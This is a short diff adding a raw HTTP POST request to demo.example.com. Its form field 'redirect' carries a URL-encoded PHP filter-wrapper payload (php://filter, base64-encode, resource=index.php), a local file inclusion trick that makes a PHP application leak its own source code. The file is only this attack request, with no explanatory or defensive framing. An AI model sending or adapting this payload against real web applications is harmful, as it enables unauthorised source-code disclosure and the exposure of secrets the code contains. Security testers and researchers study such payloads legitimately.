@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+Connection: close
+
+redirect=f%3Dphp%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dindex.php
